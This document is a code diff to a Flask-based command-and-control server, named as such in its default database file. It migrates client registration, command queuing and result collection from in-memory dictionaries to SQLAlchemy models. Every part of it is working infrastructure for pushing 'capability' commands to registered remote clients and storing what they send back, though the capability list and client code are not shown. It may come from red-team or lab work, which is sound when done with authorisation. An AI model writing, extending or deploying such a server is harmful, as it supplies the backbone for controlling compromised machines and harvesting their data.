@@ -11,6 +11,7 @@ import json
 import logging
 import os
 from dotenv import load_dotenv
+from models import db, Client, Command, Result, init_db
 
 # Load environment variables
 load_dotenv()
@@ -18,6 +19,13 @@ load_dotenv()
 # Initialize Flask app
 app = Flask(__name__, static_folder='static', static_url_path='')
 CORS(app)
+
+# Configure database
+app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///c2_server.db')
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+# Initialize database
+init_db(app)
 
 # Configure logging
 logging.basicConfig(
@@ -29,12 +37,6 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
-
-# Data structures
-clients = {}          # Store registered clients with metadata
-commands = {}         # Store pending commands per client: {client_id: {"capability": int, "args": str}}
-results = []          # Store execution results
-client_capabilities = {}  # Store capabilities status per client
 
 # Capability IDs
 CAPABILITIES = {
@@ -61,17 +63,26 @@ def register():
         return jsonify({"status": "error", "message": "Client ID required"}), 400
     
     # Register or update client
-    clients[client_id] = {
-        "id": client_id,
-        "registered_at": datetime.now().isoformat(),
-        "last_seen": datetime.now().isoformat(),
-        "ip": request.remote_addr,
-        "status": "active"
-    }
+    client = Client.query.get(client_id)
+    if client:
+        # Update existing client
+        client.last_seen = datetime.utcnow()
+        client.ip = request.remote_addr
+        client.status = 'active'
+    else:
+        # Create new client
+        client = Client(
+            id=client_id,
+            ip=request.remote_addr,
+            status='active'
+        )
+        db.session.add(client)
+        
+        # Initialize command for this client
+        cmd = Command(client_id=client_id, capability=0, args='')
+        db.session.add(cmd)
     
-    # Initialize command queue
-    commands[client_id] = {"capability": 0, "args": ""}  # No command by default
-    client_capabilities[client_id] = {}
+    db.session.commit()
     
     logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
     
@@ -95,23 +106,26 @@ def get_command():
         return "0", 400
     
     # Update last seen timestamp
-    if client_id in clients:
-        clients[client_id]["last_seen"] = datetime.now().isoformat()
+    client = Client.query.get(client_id)
+    if client:
+        client.last_seen = datetime.utcnow()
+        db.session.commit()
     else:
         logger.warning(f"Command request from unregistered client: {client_id}")
         return "0", 404
     
-    cmd = commands.get(client_id, {"capability": 0, "args": ""})
+    # Get pending command
+    cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
     
-    if cmd["capability"] != 0:
-        logger.info(f"[*] Capability command sent to {client_id}: {cmd['capability']} ({CAPABILITIES.get(cmd['capability'], 'Unknown')}) with args: {cmd['args']}")
-        # Reset command to 0 after client fetches it
-        commands[client_id] = {"capability": 0, "args": ""}
+    if cmd and cmd.capability != 0:
+        logger.info(f"[*] Capability command sent to {client_id}: {cmd.capability} ({CAPABILITIES.get(cmd.capability, 'Unknown')}) with args: {cmd.args}")
+        # Mark command as executed
+        cmd.executed = True
+        db.session.commit()
+        return jsonify({"capability": cmd.capability, "args": cmd.args}), 200
     else:
         logger.debug(f"[*] No pending command for {client_id}")
-    
-    # Return JSON with capability and args
-    return jsonify(cmd), 200
+        return jsonify({"capability": 0, "args": ""}), 200
 
 
 @app.route('/api/report', methods=['POST'])
@@ -131,31 +145,28 @@ def report():
         
         client_id = data.get('id')
         capability = data.get('capability')
-        result = data.get('result')
+        result_data = data.get('result')
         
         if not client_id:
             logger.warning("Report without client ID")
             return jsonify({"status": "error", "message": "Client ID required"}), 400
         
         # Update client last seen
-        if client_id in clients:
-            clients[client_id]["last_seen"] = datetime.now().isoformat()
+        client = Client.query.get(client_id)
+        if client:
+            client.last_seen = datetime.utcnow()
         
         # Store result
-        report_entry = {
-            "client": client_id,
-            "capability": capability,
-            "result": result,
-            "timestamp": datetime.now().isoformat(),
-            "ip": request.remote_addr
-        }
-        results.append(report_entry)
+        result = Result(
+            client_id=client_id,
+            capability=capability,
+            result=result_data,
+            ip=request.remote_addr
+        )
+        db.session.add(result)
+        db.session.commit()
         
-        # Clear command after execution
-        if client_id in commands:
-            commands[client_id] = {"capability": 0, "args": ""}
-        
-        logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result[:50]}...")
+        logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result_data[:50] if result_data else 'N/A'}...")
         
         return jsonify({
             "status": "received",
@@ -164,6 +175,7 @@ def report():
         
     except Exception as e:
         logger.error(f"Error processing report: {str(e)}")
+        db.session.rollback()
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
@@ -173,9 +185,10 @@ def list_clients():
     List all registered clients
     URL: GET /api/clients
     """
+    clients = Client.query.all()
     return jsonify({
         "count": len(clients),
-        "clients": clients
+        "clients": {client.id: client.to_dict() for client in clients}
     }), 200
 
 
@@ -186,9 +199,10 @@ def list_results():
     URL: GET /api/results
     """
     limit = request.args.get('limit', 100, type=int)
+    results = Result.query.order_by(Result.timestamp.desc()).limit(limit if limit > 0 else None).all()
     return jsonify({
         "count": len(results),
-        "results": results[-limit:] if limit > 0 else results
+        "results": [r.to_dict() for r in results]
     }), 200
 
 
@@ -215,10 +229,19 @@ def send_command():
         if capability_id not in CAPABILITIES:
             return jsonify({"status": "error", "message": f"Invalid capability ID. Valid: {list(CAPABILITIES.keys())}"}), 400
         
-        if client_id not in clients:
+        client = Client.query.get(client_id)
+        if not client:
             return jsonify({"status": "error", "message": "Client not found"}), 404
         
-        commands[client_id] = {"capability": capability_id, "args": args}
+        # Create new command
+        cmd = Command(
+            client_id=client_id,
+            capability=capability_id,
+            args=args
+        )
+        db.session.add(cmd)
+        db.session.commit()
+        
         logger.info(f"[*] Assigned capability {capability_id} ({CAPABILITIES[capability_id]}) to {client_id} with args: {args}")
         
         return jsonify({
@@ -232,6 +255,7 @@ def send_command():
         
     except Exception as e:
         logger.error(f"Error sending command: {str(e)}")
+        db.session.rollback()
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
@@ -241,13 +265,17 @@ def get_client(client_id):
     Get details of a specific client
     URL: GET /api/client/<client_id>
     """
-    if client_id not in clients:
+    client = Client.query.get(client_id)
+    if not client:
         return jsonify({"status": "error", "message": "Client not found"}), 404
+    
+    # Get pending command
+    pending_cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
     
     return jsonify({
         "status": "success",
-        "client": clients[client_id],
-        "pending_command": commands.get(client_id, 0)
+        "client": client.to_dict(),
+        "pending_command": pending_cmd.to_dict() if pending_cmd else None
     }), 200
 
 
@@ -257,15 +285,16 @@ def get_client_results(client_id):
     Get all results from a specific client
     URL: GET /api/client/<client_id>/results
     """
-    if client_id not in clients:
+    client = Client.query.get(client_id)
+    if not client:
         return jsonify({"status": "error", "message": "Client not found"}), 404
     
-    client_results = [r for r in results if r['client'] == client_id]
+    client_results = Result.query.filter_by(client_id=client_id).order_by(Result.timestamp.desc()).all()
     return jsonify({
         "status": "success",
         "client_id": client_id,
         "count": len(client_results),
-        "results": client_results
+        "results": [r.to_dict() for r in client_results]
     }), 200
 
 
@@ -275,11 +304,14 @@ def health():
     Health check endpoint
     URL: GET /api/health
     """
+    clients_count = Client.query.count()
+    results_count = Result.query.count()
+    
     return jsonify({
         "status": "healthy",
-        "timestamp": datetime.now().isoformat(),
-        "clients_count": len(clients),
-        "results_count": len(results)
+        "timestamp": datetime.utcnow().isoformat(),
+        "clients_count": clients_count,
+        "results_count": results_count
     }), 200
 
 
@@ -312,7 +344,7 @@ def api_index():
         "version": "2.0.0",
         "status": "running",
         "deployment": "docker-only",
-        "timestamp": datetime.now().isoformat(),
+        "timestamp": datetime.utcnow().isoformat(),
         "endpoints": {
             "register": "GET /api/register?id=<client_id>",
             "get_command": "GET /api/command?id=<client_id>",
